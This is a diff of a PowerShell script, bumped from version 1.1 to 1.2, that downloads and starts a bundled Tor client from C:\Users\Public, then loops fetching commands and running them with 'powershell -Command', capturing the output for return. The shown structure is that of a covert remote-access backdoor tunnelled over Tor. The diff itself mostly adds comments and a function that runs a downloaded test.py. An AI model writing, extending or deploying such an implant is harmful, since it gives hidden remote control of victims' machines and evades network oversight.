@@ -1,4 +1,4 @@
-## VERSION 1.1
+## VERSION 1.2
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
@@ -15,6 +15,7 @@ $testFilePath = "$extract\test.py"
 
 # Downloads from GitHub
 function download {
+    # Download T
     if (Test-Path $extract) {
         "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
     } else {
@@ -26,6 +27,7 @@ function download {
         Remove-Item $zip
     }
 
+    # Download test.py
     if (Test-Path $testFilePath) {
         "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
     } else {
@@ -41,10 +43,12 @@ function writeConfig {
     }
 }
 
+# Starts T
 function startTor {
     Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $deConfigPath" -WindowStyle Normal
 }
 
+# Waits for T
 function waitForTor {
     do {
         Start-Sleep -Seconds 3
@@ -60,7 +64,7 @@ function main {
 
         if ($cmd -and $cmd -ne "noop") {
             try {
-                # Capture output including errors
+                # Capture output including errors and noop
                 $output = powershell -Command "$cmd" 2>&1 | Out-String
                 $output = ($output -split "`r?`n" | Where-Object { $_.Trim() -ne "" }) -join "`n"
                 $outText = "SUCCESS:`n$output"
@@ -81,6 +85,10 @@ function main {
         "ERROR: $($_.Exception.Message)" | Out-File -Append -FilePath $log
     }
     Start-Sleep -Seconds 5
+}
+
+function testPython {
+    python test.py
 }
 
 download
